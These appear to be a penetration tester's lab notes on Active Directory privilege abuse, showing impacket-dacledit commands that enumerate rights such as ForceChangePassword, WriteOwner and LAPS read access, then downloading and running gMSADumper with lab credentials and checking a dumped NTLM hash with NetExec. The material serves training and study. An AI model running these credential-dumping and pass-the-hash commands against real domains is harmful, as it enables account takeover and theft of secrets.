
## Using dacledit.py
#### Query what rights the UserX has over the target account `TARGET-USER`:
```shell
impacket-dacledit -principal <UserX> -target <TARGET-USER> -dc-ip <DOMAIN-IP> DOMAIN.local/<UserX>:<PASSWORD>
```
##### Examples
**WriteProperty** or **Validated-SPN** over the target account.

<img width="2420" height="519" alt="Pasted image 20251226114456" src="https://github.com/user-attachments/assets/812de2ee-5a53-4c1d-8695-ffb6710a9e8c" />
##### Querying UserX's DACL over the Domain
```shell
impacket-dacledit -principal <UserX> -target-dn dc=<domain>,dc=local -dc-ip 10.129.205.81 domain.local/<UserX>:<PASSWORD>
```
![[Pasted image 20251230121849.png]]
##### As we can see in the above output, `Pedro`, has **Self-Membership** over the target group `Backup Operators`; this means that `Pedro` can add himself to the group, but `Pedro` cannot add any other user.
![[Pasted image 20251226233506.png]]
##### **All Extended Right**
![[Pasted image 20251227215942.png]]
##### `Pedro` has **ForceChangePassword** over `TARGET-USER`
![[Pasted image 20251229140458.png]]
##### pedro has **FullControl** over a `TARGET-USER`
![[Pasted image 20251229140619.png]]
##### pedro has **AllExtendedRights** over a `TARGET-USER`
![[Pasted image 20251229140708.png]]
##### Look for: **ReadProperty** on GUID `de4ae365-abab-4cd0-a85a-682150772084` for **ReadLAPSPassword**
![[Pasted image 20251229183138.png]]
##### Pedro's **WriteOwner** over the User `GPOAdmin`:
![[Pasted image 20251230153906.png]]
## ReadGMSAPassword
```shell
wget https://github.com/micahvandeusen/gMSADumper/raw/refs/heads/main/gMSADumper.py
python3 gMSADumper.py -d inlanefreight.local -l 10.129.139.3 -u pedro -p SecuringAD01
```
![[Pasted image 20251229191306.png]]
##### use `NetExec` to validate the credentials
```shell
netexec ldap 10.129.139.3 -u jenkins-dev$ -H 14a45cca9fd6ef26c7f2140bb5a8be98
```
